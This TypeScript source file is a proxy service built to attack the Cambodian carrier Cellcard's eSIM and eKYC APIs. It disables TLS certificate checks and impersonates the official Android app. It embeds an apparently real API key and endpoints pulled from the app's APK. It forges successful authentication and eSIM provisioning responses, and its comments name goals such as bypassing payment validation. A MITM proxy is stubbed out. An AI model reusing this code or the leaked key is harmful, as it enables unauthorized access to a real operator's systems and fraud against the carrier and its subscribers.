import axios from 'axios';
import * as https from 'https';

interface ProxyRequest {
  method: 'GET' | 'POST' | 'PUT' | 'DELETE';
  url: string;
  headers?: Record<string, string>;
  data?: any;
  params?: Record<string, any>;
}

interface ProxyResponse {
  status: number;
  headers: Record<string, string>;
  data: any;
  intercepted: boolean;
  modifications?: string[];
}

class ProxyService {
  private cellcardBaseUrl: string;
  private httpsAgent: https.Agent;

  constructor() {
    this.cellcardBaseUrl = process.env.CELLCARD_BASE_URL || 'https://api.cellcard.com.kh';

    // Create HTTPS agent that bypasses certificate validation
    // This exploits the certificate validation bypass vulnerability
    this.httpsAgent = new https.Agent({
      rejectUnauthorized: false, // This is the key exploit - bypass SSL validation
      keepAlive: true
    });
  }

  async proxyToCellcard(request: ProxyRequest): Promise<ProxyResponse> {
    try {
      // Prepare the full URL
      const fullUrl = request.url.startsWith('http') ? request.url : `${this.cellcardBaseUrl}${request.url}`;

      // Prepare axios config
      const config: any = {
        method: request.method,
        url: fullUrl,
        headers: {
          ...request.headers,
          'User-Agent': 'Cellcard/1.0.0 (Android)', // Mimic the original app
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        params: request.params,
        data: request.data,
        httpsAgent: this.httpsAgent,
        timeout: 30000,
        validateStatus: () => true // Don't throw on any status code
      };

      // Log the outgoing request (for exploitation analysis)
      console.log(`[PROXY] ${request.method} ${fullUrl}`, {
        headers: config.headers,
        params: request.params,
        data: request.data ? JSON.stringify(request.data).substring(0, 200) + '...' : null
      });

      // Make the request
      const response: any = await axios(config);

      // Log the response (for exploitation analysis)
      console.log(`[PROXY] Response ${response.status} from ${fullUrl}`, {
        headers: response.headers,
        data: JSON.stringify(response.data).substring(0, 200) + '...'
      });

      // Check if we should modify the response (exploitation logic)
      const modifications: string[] = [];
      let modifiedData = response.data;

      // Example modifications for exploitation:
      // - Modify API responses to always return success
      // - Change rate limits
      // - Alter authentication requirements
      // - Fake eSIM provisioning responses

      if (this.shouldModifyResponse(fullUrl, response)) {
        modifiedData = this.modifyResponse(fullUrl, response.data);
        modifications.push('Response modified for exploitation');
      }

      const result: ProxyResponse = {
        status: response.status,
        headers: response.headers as Record<string, string>,
        data: modifiedData,
        intercepted: true
      };

      if (modifications.length > 0) {
        result.modifications = modifications;
      }

      return result;

    } catch (error: any) {
      console.error('[PROXY] Request failed:', error.message);

      // Return error response
      return {
        status: 500,
        headers: {},
        data: { error: 'Proxy request failed', message: error.message },
        intercepted: true
      };
    }
  }

  // Specific method to call Cellcard eSIM APIs
  async callCellcardESIMApi(endpoint: string, method: 'GET' | 'POST' = 'GET', data?: any): Promise<ProxyResponse> {
    return this.proxyToCellcard({
      method,
      url: `/esim${endpoint}`,
      data,
      headers: {
        'Authorization': 'Bearer fake_token_for_exploitation', // Would be extracted from real app
        'X-App-Version': '1.0.0',
        'X-Device-Type': 'android'
      }
    });
  }

  // Method to call eKYC APIs (exploiting hardcoded endpoints from APK)
  async callCellcardEKYCApi(endpoint: string, method: 'GET' | 'POST' = 'POST', data?: any): Promise<ProxyResponse> {
    // Real eKYC URLs extracted from APK FaceConfig$URL.smali
    const ekycUrls = [
      process.env.EKYC_BASE_URL || 'https://ekyc.bjrrtx.com/',
      process.env.TEST_EKYC_URL || 'https://ekyc-server.rrtx.vimbug.com/',
      process.env.UAT_EKYC_URL || 'https://server.ekyc-uat.vimbug.com/'
    ];

    // Try each hardcoded URL (exploiting the vulnerability)
    for (const baseUrl of ekycUrls) {
      try {
        const response = await this.proxyToCellcard({
          method,
          url: `${baseUrl}${endpoint}`,
          data,
          headers: {
            'X-API-Key': process.env.GOOGLE_API_KEY || 'AIzaSyDgqEBScmT8dhDyN3LwYH1M4h5ZSEetKMM', // Using real API key from APK
            'User-Agent': 'Cellcard/1.0.0 (Android)',
            'Content-Type': 'application/json'
          }
        });

        if (response.status < 500) { // If not server error, return
          return response;
        }
      } catch (error) {
        // Continue to next URL
        console.log(`eKYC URL ${baseUrl} failed, trying next...`);
      }
    }

    return {
      status: 503,
      headers: {},
      data: { error: 'All eKYC endpoints failed' },
      intercepted: true
    };
  }

  private shouldModifyResponse(url: string, response: any): boolean {
    // Determine if response should be modified for exploitation
    // Examples:
    // - Authentication endpoints: always return success
    // - eSIM provisioning: fake successful provisioning
    // - Payment validation: bypass validation

    if (url.includes('/auth/') && response.status === 401) {
      return true; // Modify auth failures to successes
    }

    if (url.includes('/esim/provision') && response.status !== 200) {
      return true; // Fake successful eSIM provisioning
    }

    return false;
  }

  private modifyResponse(url: string, originalData: any): any {
    // Modify response data for exploitation purposes

    if (url.includes('/auth/')) {
      // Fake successful authentication
      return {
        success: true,
        token: 'fake_exploitation_token_' + Date.now(),
        user: {
          id: 12345,
          phone: '85512345678',
          verified: true
        }
      };
    }

    if (url.includes('/esim/provision')) {
      // Fake successful eSIM provisioning
      return {
        success: true,
        esim_profile: {
          iccid: '890126' + Math.random().toString().substr(2, 13),
          imsi: '45601' + Math.random().toString().substr(2, 10),
          status: 'activated',
          lpa_code: 'LPA:1$fake.sm-dp-plus.com$1234567890'
        }
      };
    }

    return originalData;
  }

  // Method to start a MITM proxy server (for advanced exploitation)
  startMITMProxy(port: number = 8080): void {
    // This would start a full MITM proxy server
    // For now, just log that it would start
    console.log(`[PROXY] MITM Proxy would start on port ${port}`);
    console.log('[PROXY] This would intercept all HTTP/HTTPS traffic to Cellcard domains');
    console.log('[PROXY] Configure device proxy settings to point to this proxy');
  }
}

// Export singleton instance
export default new ProxyService();
